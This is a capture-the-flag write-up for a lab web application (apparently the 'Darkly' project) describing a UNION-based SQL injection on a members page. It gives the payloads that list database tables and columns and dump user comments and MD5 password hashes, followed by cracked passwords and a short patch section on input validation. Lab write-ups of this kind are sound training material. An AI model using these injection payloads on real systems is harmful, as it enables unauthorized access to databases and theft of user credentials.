# B04-SQLInjection-members

## BREACH

In this case, we have to exploit the page:

>`http://192.168.56.106/?page=member`

First we try a basic `ISQL` for list all tables,

>`0 UNION SELECT table_name, table_schema FROM information_schema.tables`

We have may lines in output but one is interesting:

![image](https://github.com/Seriots/Darkly/assets/94530285/88f32ef3-d05a-4b4c-bd67-1d3a8cf5115b)

We can see a table names users so, try to `list columns` about this `table`,

>`1 UNION SELECT column_name,null FROM information_schema.columns WHERE table_schema=database()`


![image](https://github.com/Seriots/Darkly/assets/94530285/9849d823-ef56-4438-9152-f8ba0faf88dc)

After dig into all columns we find two are interesting:  `Commentaire` and `countersign`,

>`1 OR 1 UNION SELECT Commentaire,null from users`

![image](https://github.com/Seriots/Darkly/assets/94530285/8e2492c1-b08b-41e5-808c-ba4efe4caf35)

And for countersign:

>`1 OR 1 UNION SELECT countersign,null from users`

![image](https://github.com/Seriots/Darkly/assets/94530285/4b08918e-db5b-4f59-82da-7ae72c9313fe)

We fin these encrypt text are in md5 so lets decode.

>2b3366bcfd44f540e630d4dc2b9b06d9 : YesWeCan

>60e9032c586fb422e2c16dee6286cf10 : oktoberfest

>e083b24a01c483437bcf4a9eea7c1b4d : This one can't be decrypt.

>5ff9d0165b4f92b14994e5c685cdce28 : FortyTwo

The precedent 'Commentaire' was for the last user so we have ton encrypt `fortytwo` in `sha256`

>This is ou flag : `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`


## PATCH

For patch this one we have to `improve` the `sanitization/validation` of input provide by an user,

to `block sql injection`.

Stop writing dynamic queries with string concatenation or

Prevent malicious SQL input from being included in executed queries.
